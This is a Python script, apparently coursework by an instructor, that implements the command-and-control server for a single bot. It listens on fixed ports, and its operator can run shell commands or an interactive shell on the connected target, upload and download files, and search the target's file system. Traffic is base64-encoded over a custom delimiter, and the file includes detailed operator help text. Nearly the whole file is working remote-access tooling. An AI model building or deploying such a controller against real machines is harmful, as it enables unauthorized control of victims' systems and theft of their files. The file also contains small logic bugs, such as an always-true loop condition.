#################################
## Name: Robert Hendrickson
## ID:   instructor5 
## Date: 10-07-2021
## FILE: happy_srvr.py
################################
"""
This program will create a server for Command and control of one bot.
USAGE: ~$ python3 AllSeeingEye.py
base64 module required for encoding send/recieve data.
socket module required for send/recieve data
hashlib module/md5 function required for md5 hash of file
re module required for regular expression usage
os module required to check directory on host system to verify upload file
sys module used for exiting the program
subprocess module used for screen clear at server
time module used to pause during disconnection
"""
import base64
import hashlib
import os
import re
import socket
import sys
import subprocess
import time


def screen_wipe():
    """
    This will clear the screen when called
    """
    # This will check the platform and use the os.system function to clear the screen
    if sys.platform.startswith('win'):
        os.system('cls')
    elif sys.platform.startswith('linux'):
        os.system('clear')


def mysendall(socket, data, delimiter):
    """
    This is a send function for sending information to the server
    :E_data: the base64 encoded data to send to the client
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    """
    E_data = base64.b64encode(data) + delimiter
    return socket.sendall(E_data)


def myrecvall(socket, delimiter):
    """
    This is a receive function that will decode the communication with
    the server
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    :D_data: the base 64 decoded data that is being received from the client
    """
    # Initialize the data variable for the contents from the client
    data = b''
    # Keep receiving data until delimiter is at the end
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    # base 64 decode and convert the bytes to a string
    D_data = base64.b64decode(data[:-len(delimiter)])
    # now we return the decoded data that was received from the client
    return D_data


def upload(socket, delimiter):
    """
    This function will get a user specified file from the host system
    and send it to the target system.
    :filename: the full file path on host system for upload file
    :target_loc: the full file path on the target system
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    """
    while True:
        # Get file name from user
        print("[-] Please provide the absolute path for the server file")
        filename = input("[-] What is the server file?> ")
        # Try to open the file in read binary mode to send to the client
        try:
            with open(filename, 'rb') as f:
                # The file contents will be saved in a variable for
                # use later
                data = f.read() 
        except Exception as e:
            # If there is an error print the error to the server user
            print('[-] ERROR:\nTried to open '+filename+'\nReceived Error: '+str(e))
            # Once we print the error start the loop again.
            continue 
        else: 
            # Get the location from the user and encode it as bytes
            print('[-] Please provide the absolute path of the client destination')
            target_loc = input("[-] What is the client destination?> ")
            target_loc = target_loc.encode()
            # Send the target location to the client
            mysendall(socket, target_loc, delimiter)
            # receive client message
            print(myrecvall(socket, delimiter).decode())
            # If no errors base 64 encode file contents and send through 
            # socket
            mysendall(socket, data, delimiter)
            # We receive the response from the client
            print(myrecvall(socket, delimiter).decode())
            # We tell the client we are ready for the next thing
            data = b'[-] Next'
            mysendall(socket, data, delimiter)
            break
    c_response = myrecvall(socket, delimiter).decode()
    if '[!] ERROR' in c_response:
        print("[-] ERROR:"+c_response)
    else:
        print(c_response)
   

def searcher(socket, delimiter):
    """
    This function will send the search command to the client
    and retrieve the file with hash.
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    :match: a received match from the client
    :length: the amount of matches from the search
    :results: a list of results received from the client
    """
    # Print the receive message
    print(myrecvall(socket, delimiter).decode())
    # We will get the file location to start the search and encode it
    file_loc = input("[-] Where should we start looking?> ").encode()
    # We send the file location to the client to start the search
    mysendall(socket, file_loc, delimiter)
    # We print the response from the client
    print(myrecvall(socket, delimiter).decode())
    # We ask the user if the file name is known and encode the response
    data = input('[-] Do you know the file name?> ').encode()
    # We send that data to the client
    mysendall(socket, data, delimiter)
    # We get the client response back
    known = myrecvall(socket, delimiter).decode()
    # We print the response
    print(known)
    # if the name is known we get the name and send it to the client
    if 'y' in known:
        data = input('[-] What is the file name?> ').encode()
        mysendall(socket, data, delimiter)
    else:
        # If the name is unknown we send unknown to the client
        data = b'[-] Unknown'
        mysendall(socket, data, delimiter)
    # We tell the user that we are starting the search
    print("[-] Searching for file...")
    # Receive the number of matches from the search
    length = myrecvall(socket, delimiter).decode()
    # Check it the information received is an error or no results
    if length.startswith('[!] ERROR') or length.startswith('[!] No'):
        # If the length is 0 or an error
        # print the message from the client
        print(length)
        # Tell client we are ready for message
        data = b'[-] Next'
        # Send message to client
        mysendall(socket, data, delimiter)
        # Print the received message from the client
        print(myrecvall(socket, delimiter).decode())
    else:
        # Turn the length variable into a number for looping
        length = int(length)
        # Tell client server is ready
        data = b'[-] Ready'
        # Send ready message
        mysendall(socket, data, delimiter)
        # Initialize a variable to store the results
        results = []
        # Loop through receive then send for each match
        for i in range(length):
            # The received item will be the match from the search
            match = myrecvall(socket, delimiter).decode()
            # Print the match to the screen for the user
            file_name, file_hash = match.split('--')
            print('[!] Match: {}\n    --{}'.format(file_name, file_hash))
            # Append the match to the list for later
            results.append(match)
            # Tell the client we are ready for the next one
            data = b'[-] Next'
            # Send the ready message
            mysendall(socket, data, delimiter)
        # Print the command complete message
        print(myrecvall(socket, delimiter).decode())


def advanced_help():
    print("""
    All messages that start with [-] are server side
    All messages that start with [!] are client side
    The script will start as follows:
    [-] Listening for connections...(until you receive a connection)
    [-] Connection Received
    [-] Connection established with client at <ip>
    [-] Server commands are as follows, enter them as shown:
        clear
        command
        disconnect
        download
        upload
        search
        help
        quit
        exit
    [-] user@ip:working_dir> 
    """, end='')
    input()
    print("""
    You will see the following prompt once you connect to a client:
    [-] <username>@<user_ip>:<user_working_dir> > server command
    For example, if connecting to sam at 127.0.0.1 in the home folder:
    [-] sam@127.0.0.1:/home> server command
    
    Server commands are listed below with example usage and output everything 
    inside <> will need to be replaced with your data or commands. 
    For download and upload, the absolute path is required for source file and destination.
    The absolute path includes the file name and extension.
    command     - Send a single shell command to the client. 
    |    [-] <username>@<user_ip>:<user_working_dir> > command
    |    [!] Client ready for command
    |    [!] <username>@<user_ip>:<user_working_dir> > shell command
    |    [!] Command output:
    |    <command output if there is any>
    |    [!] Client command Complete
    """, end='')
    input()
    print("""
    download    - receive a file from the client.
    |    [-] <username>@<user_ip>:<user_working_dir> > download
    |    [-] Please provide the absolute path for the client file and server destination
    |    [!] Ready for file name
    |    [-] What is the client file?> <Full path to file with extension>
    |    [-] What is the server destination?> <Full path to new location with extension>
    |    [-] File successfully downloaded to : <path provided>
    |    [!] Client command complete
    
    upload      - send a file to the client.
    |    [-] <username>@<user_ip>:<user_working_dir> > upload
    |    [-] Please provide the absolute path for the server file 
    |    [-] What server file?> <full file path of server file>
    |    [-] Please provide the absolute path for the client destination:>
    |    [-] What client destination?> <full file path to destination on the client system>
    |    [!] Ready for file contents
    |    [!] File uploaded to client at : <file location specified>
    |    [!] Client Command Complete
    """, end='')
    input()
    print("""
    search      - search the file system using regular expressions
    |    [-] <username>@<user_ip>:<user_working_dir> > search
    |    [-] Where should we start looking?> <start location on client>
    |    [-] Do you know the file name?> <yes or no>
    |    If you answer yes:
    |    |    [!] Ready for file name
    |    |    [-] What is the file name?> <file name on client system>
    |    If you answer no:
    |    |    [!] No file name, using default pattern 
    |    [-] Searching for file...
    |    <Results of search>
    |    [!] Client command complete
    """, end='')
    input()
    print("""
    help        - display the basic or advanced help string  
    |    [-] <username>@<user_ip>:<user_working_dir> > help
    |    [-] Would you like the basic or advanced help?> <basic or advanced>
    |    <help string>
    disconnect   - disconnect from the client
    |    [-] <username>@<user_ip>:<user_working_dir> disconnect
    |    [-] Listening for Connections...
    
    quit/exit    - exit the program
    |    [-] <username>@<user_ip>:<user_working_dir> quit
    |    [-] Good Day sir, you win nothing nada zip.
    |    [-] I said Good Day!
    
    clear       - clear the terminal screen
    """, end='')


def helper():
    """
    This is a help function for the server
    :basic_str: the basic server functionality with server startup
    :advanced_str: server functionality with example usage of each command and example output
    """
    basic_str = """
    The script will start as follows:
    [-] Listening for connections...(until you receive a connection)
    [-] Connection Received
    [-] Connection established with client at <ip>
    [-] Server commands are as follows, enter them as shown:
        clear
        command
        disconnect
        download
        upload
        search
        help
        quit
        exit
    [-] user@ip:working_dir> 
    
    You will see the following prompt once you connect to a client:
    [-] <username>@<user_ip>:<user_working_dir> > server command
    For example, if connecting to sam at 127.0.0.1 in the home folder:
    [-] sam@127.0.0.1:/home> server command
    
    Server commands are listed below 
    clear - clear the screen
    command - Send a shell command to the target system
    disconnect - disconnect from the client and listen for new connections
    download - download(receive) a file from the target system
    upload - Upload(send) a file ot the target system
    search - search the target for specified files using regular expressions
    help - Display server commands
    quit/exit - exit the program"""
    ask = input("[-] Would you like to view the basic or advanced help?> ")
    # Check if the user entered basic or advanced
    if 'basic' == ask.lower():
        print(basic_str)
    elif 'advanced' == ask.lower():
        advanced_help()
    else:
        print("[-] You must enter basic or advanced.")


def download(socket, delimiter):
    """
    This will download files from the client
    :recvd: the file contents from the client
    :theFile: The destination location on the server
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    """
    # Receive the file path comment from client
    print(myrecvall(socket, delimiter).decode())
    # Tell the user to provide the full path for the file
    print('[-] Please provide the absolute path for the client file')
    # We are getting the file path from the user
    data = input('[-] What is the client file?> ').encode()
    # Now we send the path to the client
    mysendall(socket, data, delimiter)
    # We receive the client file contents
    recvd = myrecvall(socket, delimiter).decode()
    # Check if there is an error. print the error
    if recvd.startswith('[!] ERROR'):
        print(recvd)
    # Prompt the user where to save the file. Write the
    # file in binary mode at the location.
    else:
        print('[-] Please provide the absolute path to the server destination')
        theFile = input("[-] What is the server destination?> ")
        with open(theFile, 'w') as outFile:
            outFile.write(recvd)
    print("[-] File successfully downloaded to: {}".format(theFile))
    # This will sync the server and client
    data = b'[-] Next'
    # Now we send the message to the client
    mysendall(socket, data, delimiter)
    # Now we print the message from the client
    print(myrecvall(socket, delimiter).decode())


def command(socket, data, delimiter):
    """
    This function will send commands to the client
    :output: the output sent from the client
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :s_prompt: The string at the start of every command
    :delimiter: a string used to denote the end of a transmission
    """
    # Initialize a value for start of while loop
    # We print that the client is ready for the command
    print(myrecvall(socket,delimiter).decode())  # client tx 1
    if data[:4] != b'back':
        # Now we send the variable to the client
        mysendall(socket, data, delimiter)  # client rx 2
        # Now we check if there is a client message or command output
        output = myrecvall(socket,delimiter).decode()  # client tx 3
        # If there is an error or message it will start with [!]
        print(output)
        # Now we tell the client we are ready for the next command
        mysendall(socket, b'[-] Next', delimiter)  # client rx 4
        # We recieve the client message
        print(myrecvall(socket,delimiter).decode())  # client tx 5
    else:
        # Now we send the variable to the client
        mysendall(socket, data, delimiter)  # client rx 2
        # Now we check if there is a client message or command output
        output = myrecvall(socket,delimiter).decode()  # client tx 3
        if output.startswith("[!]"):
            print(output)
        else:
            print('[-] Command output: ')
            print(output)
        # Now we tell the client we are ready for the next command
        mysendall(socket, b'[-] Next', delimiter)  # client rx 4
        # We recieve the client message
        print(myrecvall(socket,delimiter).decode())  # client tx 5
        

def shell(socket, delimiter, addr):
    data = b''
    while data != b'back':
        client_info = myrecvall(socket, delimiter).decode()
        # split the information received and use the name and working dir as prompt
        client_name, client_CWD = client_info.split(';')
        # We print the server commands
        print('\n[-] Enter shell command or type back to go back')
        prompt = '[!] {0}@{1}: {2}> '.format(client_name, addr, client_CWD)
        data = input(prompt).encode()
        # This will call the function defined above, we are passing the connection
        mysendall(socket, data, delimiter) 
        if data == b'back':
            break
        else:
            command(socket, data, delimiter)
            # Wait for the next server command
            continue


def main():
    """
    This function will establish a socket with the client and connect.
    :port: will be the port that is open for the client to connect to.
    :ip: this will be the server ip we will bind
    :delimiter: this is a custom delimiter that we set for sending and
                receiving information from the client.
    :srvr: this is the server socket that the client will connect to.
    :conn: this is the connection object that python will use
    :addr: this is the port, ip tuple that the connection will use
    :data: This is the information that is sent across the socket
    :D_recvd: this is the decoded data from the client
    :prompt: the string that identifies the username, ip and working directory
    :theFile: this is the file location that we will use to save
              downloaded items
    :mysendall: a function for sending information on the server
    :myrecvall: a function for receiving information on the server
    :srvr_cmds: the available server commands, refer to the helper 
                function for more information
    """
    srvr_cmds = """\n[-] Server commands are as follows, enter them as shown:
    clear
    command  
    disconnect
    download
    upload
    search
    shell
    help
    quit
    exit
"""
    # We will set the constants for our
    ports = [8888, 7777, 6666, 5555]
    ip = '0.0.0.0'
    delimiter = b"!!@@##$$!!"
    # We will now set up the server for connections
    srvr = socket.socket() 
    screen_wipe()
    # Look for any connection attempts to any of the ports in the list
    for port in ports:
        try:
            time.sleep(1)
            print("[-] Binding port: {}".format(port))  # Identify the port for connection
            srvr.bind((ip, port))  # Bind to the ip and port from user input
        except socket.error:
            continue
        else:
            break
    srvr.listen(1)  # Wait for connection to the client
    # Now we have to accept the connections and handle 
    # the communication with the client
    try:
        # Now we will start a while loop that will accept a connection. 
        # If the client drops the server will remain up.
        while True:
            print("[-] Listening for connections...")
            # we will now use the accept method once a client reaches out
            conn, addr = srvr.accept()
            # Print that a connection has occurred
            print("[-] Connection established with client at "+str(addr[0]), end='')
            # Initialize an internal while loop for data handling
            data = b'start'
            # We start our loop to handle commands as long as data isn't quit or exit
            while data != b'quit' or data != b'exit':
                # We get the working directory and username from the client.
                client_info = myrecvall(conn, delimiter).decode()
                # split the information received and use the name and working dir as prompt
                client_name, client_CWD = client_info.split(';')
                # We print the server commands
                print(srvr_cmds)
                prompt = '[-] {0}@{1}: {2}> '.format(client_name, addr[0], client_CWD)
                # Now we have our prompt: [-] user@ip:working_directory>
                # This will take the byte encoded input 
                # from the user and save it in a variable
                data = input(prompt).encode()
                # This will call the function defined above, we are passing the connection
                mysendall(conn, data, delimiter) 
                # Start our conditional for dealing with server commands
                if data == b'download':
                    # Deal with a download request
                    download(conn, delimiter)
                    # Wait for next server command
                    continue
                elif data == b'disconnect':
                    # Print the client disconnect message on the screen
                    print(myrecvall(conn, delimiter).decode())
                    # Close the connection
                    conn.close()
                    # Give the user time to read message
                    time.sleep(1)
                    # Clear the screen
                    screen_wipe()
                    # Break out of our connected loop and listen for a new connection
                    break
                elif data == b'upload':
                    # Deal wih an upload request
                    upload(conn, delimiter)
                    # Wait for the next server command
                    continue
                elif data == b'search':
                    # Now we will use our searcher function 
                    # to search the client
                    print(searcher(conn, delimiter))
                    # Wait for the next server command
                    continue
                elif data == b'clear':
                    # Use the screen wipe to clear the screen
                    screen_wipe()
                    # Wait for the next server command
                    continue
                elif data == b'command':
                    print('\n[-] Enter shell command or type back to go back\n')
                    data = input('[-] What command?> ').encode()
                    # Enter the command function to run commands
                    command(conn, data, delimiter)
                    # Wait for the next server command
                    continue
                elif data == b'help':
                    # Deal with help command by calling help function
                    helper()
                    # Wait for the next server command
                    continue 
                elif data == b'quit' or data == b'exit':
                    # Print the disconnection message from the client
                    print(myrecvall(conn, delimiter).decode())
                    # Wait for one second before clearing screen
                    time.sleep(1)
                    # Clear the screen 
                    screen_wipe()
                    # Close the server
                    srvr.close()
                    # Print a goodbye message
                    print('[-] Good Day Sir, you win nothing nada zip!')
                    sys.exit()
                elif data == b'shell':
                    # start a shell with the client
                    shell(conn, delimiter, addr[0])
                    continue
    except KeyboardInterrupt:
        # If a ctrl + c is entered we print the message
        print("\n[-] Good Day Sir! I said good day!")  
        # Close the server object
        srvr.close()
        # Exit the program
        sys.exit()
    except Exception as e:
        # Print any error received from server side during connection attempt
        typee = str(type(e)).split()[1].split('>')[0]
        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
        # Close the server object
        srvr.close()
        # Exit the program
        sys.exit()


if __name__ == "__main__":
    main() 
